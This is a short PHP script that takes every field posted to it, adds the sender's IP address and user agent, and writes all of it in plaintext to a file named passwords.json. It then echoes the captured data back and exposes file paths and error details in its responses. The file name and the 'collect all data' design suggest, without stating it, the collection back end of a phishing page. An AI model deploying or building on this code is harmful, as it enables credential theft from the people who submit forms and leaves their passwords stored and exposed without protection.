<?php
// Enable full error reporting
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Ensure JSON response
header('Content-Type: application/json');

try {
    // Check if it's a POST request
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Only POST requests are allowed');
    }

    // Attempt to get the absolute path for the data file
    $dataFile = __DIR__ . '/passwords.json';

    // Collect ALL data received in the form
    $formData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'post_data' => $_POST,
        'server_info' => [
            'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'Unknown'
        ]
    ];

    // Multiple write strategies
    $writeSuccessful = false;

    // Strategy 1: Standard file_put_contents with error handling
    try {
        // Read existing data
        $existingData = [];
        if (file_exists($dataFile)) {
            $fileContents = @file_get_contents($dataFile);
            $existingData = json_decode($fileContents, true) ?: [];
        }

        // Add new entry
        $existingData[] = $formData;

        // Attempt to write data
        $jsonData = json_encode($existingData, JSON_PRETTY_PRINT);
        
        // Try multiple write methods
        $writeResult = false;
        
        // Method 1: Standard write with exclusive lock
        $writeResult = @file_put_contents($dataFile, $jsonData, LOCK_EX);
        
        if ($writeResult === false) {
            // Method 2: Try without lock
            $writeResult = @file_put_contents($dataFile, $jsonData);
        }
        
        if ($writeResult !== false) {
            $writeSuccessful = true;
        }
    } catch (Exception $e) {
        // Catch and log any write errors
        error_log('Write Error: ' . $e->getMessage());
    }

    // Strategy 2: Alternative write method using file handling
    if (!$writeSuccessful) {
        try {
            $handle = @fopen($dataFile, 'c+');
            if ($handle !== false) {
                // Lock the file
                if (flock($handle, LOCK_EX)) {
                    // Truncate the file
                    ftruncate($handle, 0);
                    
                    // Write new content
                    fwrite($handle, json_encode($existingData, JSON_PRETTY_PRINT));
                    
                    // Release the lock
                    flock($handle, LOCK_UN);
                    
                    // Close the file
                    fclose($handle);
                    
                    $writeSuccessful = true;
                }
            }
        } catch (Exception $e) {
            error_log('Alternative Write Error: ' . $e->getMessage());
        }
    }

    // Check if write was successful
    if (!$writeSuccessful) {
        throw new Exception('Failed to write to passwords.json after multiple attempts');
    }

    // Successful response
    echo json_encode([
        'status' => 'success', 
        'message' => 'Data received and saved',
        'received_data' => $formData
    ]);
    exit();

} catch (Exception $e) {
    // Detailed error response
    http_response_code(500);
    echo json_encode([
        'status' => 'error', 
        'message' => $e->getMessage(),
        'file' => $e->getFile(),
        'line' => $e->getLine(),
        'additional_info' => [
            'file_path' => $dataFile,
            'is_dir_writable' => is_writable(dirname($dataFile)),
            'file_exists' => file_exists($dataFile),
            'file_writable' => is_writable($dataFile)
        ]
    ]);
    exit();
}